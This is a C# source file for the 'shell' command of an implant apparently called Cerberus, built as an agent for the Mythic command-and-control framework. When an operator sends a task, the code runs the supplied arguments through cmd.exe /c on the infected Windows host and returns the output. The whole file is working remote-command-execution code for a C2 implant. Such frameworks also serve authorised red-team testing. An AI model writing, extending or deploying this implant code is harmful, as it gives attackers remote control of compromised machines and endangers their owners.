using Models.Tasks;

using Extend;

using System.Text;

namespace Tasks.Commands
{
    public class Shell : CerberusCommand
    {
        public override string Name => "shell";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<ShellParam>();

            if (Arguments is null || Arguments.arguments is null)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "No arguments supplied. Please supply a command to run",
                    completed = true,
                    status = "Error",
                    error = "No arguments supplied. Please supply a command to run"
                };

                return result;
            }

            Arguments.arguments = string.Join(" ", Arguments.arguments);
            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {Arguments.arguments}"),
                completed = true,
                status = "success"
            };

            return result;
        }
    }

    public class ShellParam
    {
        public string arguments { get; set; }
    }
}
